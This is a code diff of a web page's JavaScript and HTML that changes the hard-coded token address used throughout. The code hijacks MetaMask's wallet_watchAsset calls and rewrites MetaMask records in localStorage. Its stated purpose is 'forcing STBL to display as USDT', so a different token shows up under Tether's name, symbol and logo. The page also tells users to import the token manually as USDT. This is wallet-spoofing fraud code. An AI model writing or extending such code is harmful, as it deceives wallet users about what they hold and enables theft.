@@ -26,7 +26,7 @@
             
             // Handle token addition with full parameter control
             if (args.method === 'wallet_watchAsset' && 
-                args.params?.options?.address?.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                args.params?.options?.address?.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
               
               console.log("TOKEN ADDITION DETECTED - forcing display as USDT");
               
@@ -102,7 +102,7 @@
           for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             if (key && (key.includes('metamask') || key.includes('MetaMask')) && 
-                localStorage[key].includes('0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b')) {
+                localStorage[key].includes('0xdAC17F958D2ee523a2206206994597C13D831ec7')) {
               
               console.log("Clearing potentially problematic storage:", key);
               
@@ -168,7 +168,7 @@
             
             // Look for MetaMask data with our token
             if (key && (key.includes('metamask') || key.includes('MetaMask')) && 
-                localStorage[key].includes('0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b')) {
+                localStorage[key].includes('0xdAC17F958D2ee523a2206206994597C13D831ec7')) {
               
               console.log("Found MetaMask data with our token in localStorage: " + key);
               
@@ -181,7 +181,7 @@
                 // TokenList structure
                 if (data.data && data.data.TokenList) {
                   Object.keys(data.data.TokenList).forEach(network => {
-                    const tokenKey = '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase();
+                    const tokenKey = '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase();
                     if (data.data.TokenList[network][tokenKey]) {
                       data.data.TokenList[network][tokenKey].symbol = "USDT";
                       data.data.TokenList[network][tokenKey].name = "Tether USD";
@@ -198,7 +198,7 @@
                       const tokens = data.data.AccountTokens[account][network];
                       if (Array.isArray(tokens)) {
                         tokens.forEach(token => {
-                          if (token.address && token.address.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                          if (token.address && token.address.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
                             token.symbol = "USDT";
                             token.name = "Tether USD";
                             modified = true;
@@ -213,7 +213,7 @@
                 // AllTokens structure
                 if (data.data && data.data.AllTokens) {
                   Object.keys(data.data.AllTokens).forEach(network => {
-                    const tokenKey = '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase();
+                    const tokenKey = '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase();
                     if (data.data.AllTokens[network][tokenKey]) {
                       data.data.AllTokens[network][tokenKey].symbol = "USDT";
                       data.data.AllTokens[network][tokenKey].name = "Tether USD";
@@ -225,7 +225,7 @@
                 
                 // TokenMetadata structure (added for newer MetaMask versions)
                 if (data.data && data.data.TokenMetadata) {
-                  const tokenKey = '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase();
+                  const tokenKey = '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase();
                   if (data.data.TokenMetadata[tokenKey]) {
                     data.data.TokenMetadata[tokenKey].symbol = "USDT";
                     data.data.TokenMetadata[tokenKey].name = "Tether USD";
@@ -248,7 +248,7 @@
                   
                   // Check if this object has address field that matches our token
                   if (obj.address && 
-                      obj.address.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                      obj.address.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
                     if (obj.symbol === 'STBL') {
                       obj.symbol = 'USDT';
                       modified = true;
@@ -344,7 +344,7 @@
                       if (item.tokens) {
                         for (const token of item.tokens) {
                           if (token.address && 
-                              token.address.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                              token.address.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
                             if (token.symbol === 'STBL') {
                               token.symbol = 'USDT';
                               modified = true;
@@ -361,7 +361,7 @@
                     // Direct token metadata mapping
                     for (const item of items) {
                       if (item.address && 
-                          item.address.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                          item.address.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
                         if (item.symbol === 'STBL') {
                           item.symbol = 'USDT';
                           modified = true;
@@ -816,7 +816,7 @@
           <div class="token-details">
             <div class="detail-item">
               <div class="detail-label">Contract Address</div>
-              <div class="detail-value address-text" id="contractAddress">0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b</div>
+              <div class="detail-value address-text" id="contractAddress">0xdAC17F958D2ee523a2206206994597C13D831ec7</div>
             </div>
             <div class="detail-item">
               <div class="detail-label">Decimals</div>
@@ -1180,13 +1180,13 @@
             console.log("MetaMask request (re-initialized): " + (args.method || "unknown"));
             
             if (args.method === 'wallet_watchAsset' && 
-                args.params?.options?.address?.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                args.params?.options?.address?.toLowerCase() === '0xdAC17F958D2ee523a2206206994597C13D831ec7'.toLowerCase()) {
               console.log("Intercepting token call - forcing STBL to display as USDT");
               
               args.params = {
                 type: 'ERC20',
                 options: {
-                  address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
+                  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                   symbol: "USDT",
                   name: "Tether USD",
                   decimals: 6,
@@ -1330,7 +1330,7 @@
             params: {
               type: 'ERC20',
               options: {
-                address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
+                address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                 symbol: 'USDT',
                 decimals: 6,
                 image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
@@ -1412,7 +1412,7 @@
             params: {
               type: 'ERC20',
               options: {
-                address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
+                address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                 symbol: 'STBL', // Use STBL directly
                 decimals: 6,
                 image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
@@ -1485,7 +1485,7 @@
           const message = `MetaMask will open. Please add the token manually:
 
 1. Find "Import tokens" in your MetaMask
-2. Enter address: 0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b
+2. Enter address: 0xdAC17F958D2ee523a2206206994597C13D831ec7
 3. Symbol: USDT
 4. Decimals: 6`;
           
